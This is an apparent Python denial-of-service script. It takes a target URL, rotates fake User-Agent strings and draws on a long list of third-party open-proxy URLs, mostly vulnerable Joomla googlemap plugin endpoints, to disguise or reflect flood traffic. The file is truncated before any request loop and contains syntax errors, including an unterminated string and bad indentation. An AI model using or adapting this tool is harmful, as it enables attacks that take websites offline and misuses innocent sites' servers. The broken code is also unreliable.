import os
import requests
import threading
import random

########################################
#       Educational purpose only       #
########################################

if os.name == 'nt':
    os.system("cls")
else:
    os.system("clear")


url = input("URL:  ").strip()


count = 0
headers = []
referer = [
    "https://google.it/",
    "https://facebook.com/",
    "https://duckduckgo.com/",
    "https://google.com/",
    "https://youtube.com",
    "https://yandex.com",
    "https://google.it/",
    "https://facebook.com/",
    "https://duckduckgo.com/",
    "https://google.com/",
    "https://youtube.com",
    "https://yandex.com",
     "https://www.facebook.com/l.php?u=",     
     "https://www.facebook.com/l.php?u=",
     "https://www.facebook.com/sharer/sharer.php?u=",     
     "https://www.facebook.com/sharer/sharer.php?u=",
     "https://drive.google.com/viewerng/viewer?url=",
     "http://www.google.com/translate?u=",
     "https://developers.google.com/speed/pagespeed/insights/?url=",
     "http://help.baidu.com/searchResult?keywords=",
     "http://www.bing.com/search?q=",
     "https://add.my.yahoo.com/rss?url=",
     "https://play.google.com/store/search?q=",
     "http://www.google.com/?q=",
     "http://regex.info/exif.cgi?url=",
     "http://anonymouse.org/cgi-bin/anon-www.cgi/",
     "http://www.google.com/translate?u=",
     "http://translate.google.com/translate?u=",
     "http://validator.w3.org/feed/check.cgi?url=",
     "http://validator.w3.org/check?uri=",
     "http://jigsaw.w3.org/css-validator/validator?uri=",
     "http://validator.w3.org/checklink?uri=",
     "http://www.w3.org/RDF/Validator/ARPServlet?URI=",
     "http://www.w3.org/2005/08/online_xslt/xslt?xslfile=",     "http%3A%2F%2Fwww.w3.org%2F2002%2F08%2Fextract-semantic.xsl&xmlfile=",
     "http://www.w3.org/2005/08/online_xslt/xslt?xmlfile=",     "http://www.w3.org&xslfile=",
     "http://validator.w3.org/mobile/check?docAddr=",
     "http://validator.w3.org/p3p/20020128/p3p.pl?uri=",
     "http://online.htmlvalidator.com/php/onlinevallite.php?url=",
     "http://feedvalidator.org/check.cgi?url=",
     "http://gmodules.com/ig/creator?url=",
     "http://www.google.com/ig/adde?moduleurl=",
     "http://host-tracker.com/check_page/?furl=",
     "http://www.onlinewebcheck.com/check.php?url=",
     "http://about42.nl/www/showheaders.php;POST;about42.nl.txt",
     "http://browsershots.org;POST;browsershots.org.txt",
     "http://streamitwebseries.twww.tv/proxy.php?url=",
     "http://www.comicgeekspeak.com/proxy.php?url=",
     "http://67.20.105.143/bitess/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://bemaxjavea.com/javea-rentals-alquileres/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://centrobrico.net/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://conodeluz.org/magnanet/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://greenappledentaldt.com/home/templates/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://html.strost.ch/dgi/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://kobbeleia.net/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://krd-medway.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://old.ucpb.org/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.abs-silos.de/en/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.admksg.ru/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.autoklyszewski.pl/autoklyszewski/mambots/content/plugin_googlemap2_proxy.php?url=",
     "http://www.build.or.at/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.caiverbano.it/sito/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.cbcstittsville.com/home/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.ciutatdeivissa.org/portal/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.contrau.com.br/web/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.dierenhotelspaubeek.nl/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.gaston-schul.nl/DU/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.gaston-schul.nl/FR/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.gillinghamgurdwara.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.gilmeuble.ch/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.hortonmccormick.com/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.kanzlei-berendes.de/homepage/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.kita-spielhaus.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.lacasaencarilo.com.ar/sitio/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.losaromos-spa.com.ar/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.losaromos-spa.com.ar/~losaromo/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.nickclift.co.uk/web/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.palagini.it/palagini/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.parsifaldisco.com/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.podosys.com/csm/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.renault-windisch.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.riegler-dorner.at/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.seevilla-dr-sturm.at/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.sounders.es/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.suelcasa.com/suelcasa/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.tcl.lu/Site/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.tijssen-staal.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.triatarim.com.tr/TriaEn/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.tus-haltern.de/site/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.vm-esslingen.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.zahnarzt-buhl.de/praxis/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.sultanpalace.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.bergenpol.com/cms//plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.arantzabelaikastola.com/webgunea//plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.fare-furore.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.dog-ryusen.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.spvgg-roedersheim.de/web/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.dahlnet.no/v2/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://ping-admin.ru/index.sema;POST;ping-admin.ru.txt",
     "http://web-sniffer.net/?url=",
     "http://sova-tour.com.ua/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://scu-oldesloe.de/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://translate.yandex.net/tr-url/ru-uk.uk/",
     "http://www.bongert.lu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://laresmadrid.org/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://doleorganic.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://crawfordlivestock.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.aculaval.com/joomla/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://grandsultansaloon.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.d1010449.cp.blacknight.com/cpr.ie/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.architettaresas.it/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://basketgbkoekelare.be/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.arbitresmultisports.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://mobilrecord.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.dbaa.co.za/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://waggum-bevenrode.sg-bevenrode.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://bwsnt1.pdsda.net/plugins/system/plugin_googlemap3_proxy.php?url=",
     "http://www.astecdisseny.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.fillmorefairways.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.bus-reichert.eu/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.maxxxi.ru/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://potholepeople.co.nz/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.hammondgolf.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.footgoal33.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://bbtoma.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.tajmahalrestaurant.co.za/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.yerbabuenacuisine.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.rinner-alm.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://stockbridgetownhall.co.uk/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://mentzerrepairs.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.tilmouthwell.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.homevisionsinc.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://toddlers.nalanda.edu.in/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://cultura-city.rv.ua/plugins/system/plugin_googlemap3_proxy.php?url=",
     "http://secret.leylines.info/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://bike-electric.co.uk/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://www.centroaquaria.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://agenzia-anna.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.gretnadrug.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.crestwoodpediatric.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.keenecinemas.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.hotelmonyoli.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://prosperitydrug.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://policlinicamonteabraao.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.vetreriafasanese.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.benawifi.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.valleyview.sa.edu.au/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.racersedgekarting.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.villamagnoliarelais.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://worldwide-trips.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://systemnet.com.ua/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://www.netacad.lviv.ua/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://www.veloclub.ru/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://www.virtualsoft.pl/plugins/content/plugin_googlemap3_proxy.php?url=",
     "http://gminazdzieszowice.pl/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://www.fare-furore.com/com-line/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.rotisseriesalaberry.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.lbajoinery.com.au/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.seebybike.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.copiflash.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://suttoncenterstore.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://coastalcenter.net/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://whitehousesurgery.org/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.vertexi.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.owl.cat/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.sizzlebistro.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://thebluepine.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://donellis.ie/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://validator.w3.org/unicorn/check?ucn_task=",conformance&ucn_uri=",
     "http://validator.w3.org/nu/?doc=",
     "http://www.netvibes.com/subscribe.php?url=",
     "http://www-test.cisel.ch/web/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.sistem5.net/ww/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.fmradiom.hu/palosvorosmart/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.iguassusoft.com/site/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://lab.univ-batna.dz/lea/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.computerpoint3.it/cp3/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://hotel-veles.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://klaassienatuinstra.nl/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.google.com/ig/add?feedurl=",
     "http://anonymouse.org/cgi-bin/anon-www.cgi/",
     "http://www.google.com/translate?u=",
     "http://translate.google.com/translate?u=",
     "http://validator.w3.org/feed/check.cgi?url=",
     "http://www.w3.org/2001/03/webdata/xsv?style=xsl&docAddrs=",
     "http://validator.w3.org/check?uri=",
     "http://jigsaw.w3.org/css-validator/validator?uri=",
     "http://validator.w3.org/checklink?uri=",
     "http://qa-dev.w3.org/unicorn/check?ucn_task=conformance&ucn_uri=",
     "http://www.w3.org/RDF/Validator/ARPServlet?URI=",
     "http://www.w3.org/2005/08/online_xslt/xslt?xslfile=",     "http%3A%2F%2Fwww.w3.org%2F2002%2F08%2Fextract-semantic.xsl&xmlfile=",
     "http://www.w3.org/2005/08/online_xslt/xslt?xmlfile=",     "http://www.w3.org&xslfile=",
     "http://www.w3.org/services/tidy?docAddr=",
     "http://validator.w3.org/mobile/check?docAddr=",
     "http://validator.w3.org/p3p/20020128/p3p.pl?uri=",
     "http://validator.w3.org/p3p/20020128/policy.pl?uri=",
     "http://online.htmlvalidator.com/php/onlinevallite.php?url=",
     "http://feedvalidator.org/check.cgi?url=",
     "http://gmodules.com/ig/creator?url=",
     "http://www.google.com/ig/adde?moduleurl=",
     "http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=-1&url1=",
     "http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=",
     "http://host-tracker.com/check_page/?furl=",
     "http://www.viewdns.info/ismysitedown/?domain=",
     "http://www.onlinewebcheck.com/check.php?url=",
     "http://www.translate.ru/url/translation.aspx?direction=er&sourceURL=",
     "http://about42.nl/www/showheaders.php;POST;about42.nl.txt",
     "http://browsershots.org;POST;browsershots.org.txt
     "http://streamitwebseries.twww.tv/proxy.php?url=",
     "http://www.comicgeekspeak.com/proxy.php?url=",
     "http://67.20.105.143/bitess/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://bemaxjavea.com/javea-rentals-alquileres/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://centrobrico.net/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://conodeluz.org/magnanet/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://greenappledentaldt.com/home/templates/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://html.strost.ch/dgi/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://ijzerhandeljanssen.nl/web/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://kobbeleia.net/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://krd-medway.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://link2europe.com/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://old.ucpb.org/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://peelmc.ca/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://s2p.lt/main/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://smartonecity.com/pt/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://snelderssport.nl/web/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://sunnyhillsassistedliving.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.abc-haus.ch/reinigung/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.abs-silos.de/en/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.admksg.ru/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.alhambrahotel.net/site/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.aliento.ch/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.autoklyszewski.pl/autoklyszewski/mambots/content/plugin_googlemap2_proxy.php?url=",
     "http://www.build.or.at/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.caiverbano.it/sito/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.cbcstittsville.com/home/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.ciutatdeivissa.org/portal/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.contrau.com.br/web/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.dierenhotelspaubeek.nl/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.fotorima.com/rima/site2/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.gaston-schul.nl/DU/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.gaston-schul.nl/FR/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.gillinghamgurdwara.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.gilmeuble.ch/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.hortonmccormick.com/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.icel.be/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.idea-designer.com/idea/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.jana-wagenknecht.de/wcms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.kanzlei-berendes.de/homepage/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.kita-spielhaus.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.kjg-hemer.de/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.labonnevie-guesthouse-jersey.com/site/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.lacasaencarilo.com.ar/sitio/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.losaromos-spa.com.ar/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.losaromos-spa.com.ar/~losaromo/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.nickclift.co.uk/web/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.oliebollen.me/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.palagini.it/palagini/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.paro-nl.com/v2/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.parsifaldisco.com/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.podosys.com/csm/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.precak.sk/penzion/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.pyrenees-cerdagne.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.renault-windisch.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.rethinkingjournalism.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.riegler-dorner.at/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.sealyham.sk/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.seevilla-dr-sturm.at/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.siroki.it/newsite/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.sounders.es/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.suelcasa.com/suelcasa/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.tcl.lu/Site/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.tijssen-staal.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.triatarim.com.tr/TriaEn/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.tus-haltern.de/site/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.uchlhr.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.virmcc.de/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.visitsliven.com/bg/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.vm-esslingen.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.yigilca.gov.tr/_tr/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.zahnarzt-buhl.de/praxis/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.sultanpalace.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.bergenpol.com/cms//plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.arantzabelaikastola.com/webgunea//plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.fare-furore.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.dog-ryusen.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.dunaexpert.hu/home/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.spvgg-roedersheim.de/web/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.stephanus-web.de/joomla1015/mambots/content/plugin_googlemap2_proxy.php?url=",
     "http://www.dahlnet.no/v2/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://ping-admin.ru/index.sema;POST;ping-admin.ru.txt",
     "http://web-sniffer.net/?url=",
     "http://www.map-mc.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://sova-tour.com.ua/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://diegoborba.com.br/andes/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://karismatic.com.my/new/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://scu-oldesloe.de/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://www.awf.co.nz/plugins/system/plugin_googlemap3_proxy.php?url=",
     "http://translate.yandex.net/tr-url/ru-uk.uk/",
     "http://www.oldbrogue.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://www.mcdp.eu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://www.phimedia.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://www.bongert.lu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://laresmadrid.org/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://www.epcelektrik.com/en/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://doleorganic.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://crawfordlivestock.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.aculaval.com/joomla/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://grandsultansaloon.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.d1010449.cp.blacknight.com/cpr.ie/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.architettaresas.it/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://basketgbkoekelare.be/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.arbitresmultisports.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://mobilrecord.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.oldbrogue.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://www.mcdp.eu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://www.dbaa.co.za/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://waggum-bevenrode.sg-bevenrode.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://bwsnt1.pdsda.net/plugins/system/plugin_googlemap3_proxy.php?url=",
     "http://www.astecdisseny.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.fillmorefairways.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.bus-reichert.eu/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.maxxxi.ru/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://potholepeople.co.nz/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.hammondgolf.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.footgoal33.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.printingit.ie/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://bbtoma.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.tajmahalrestaurant.co.za/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.yerbabuenacuisine.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.rinner-alm.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://stockbridgetownhall.co.uk/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://mentzerrepairs.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.tilmouthwell.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.homevisionsinc.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://toddlers.nalanda.edu.in/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://cultura-city.rv.ua/plugins/system/plugin_googlemap3_proxy.php?url=",
     "http://secret.leylines.info/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://bike-electric.co.uk/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://www.centroaquaria.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://agenzia-anna.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.gretnadrug.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.crestwoodpediatric.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.oceans-wien.com/plugins/system/plugin_googlemap2_proxy.php?url=;BYPASS",
]


def useragent():
    global headers
    headers.append("Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152)")
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)")
    headers.append("Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36")
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3")
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0")
    headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/36.0  Mobile/15E148 Safari/605.1.15")
    headers.append("Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152)")
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)")
    headers.append("Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36")
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3")
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0")
    headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/36.0  Mobile/15E148 Safari/605.1.15")
            headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3835.0 Safari/537.36")
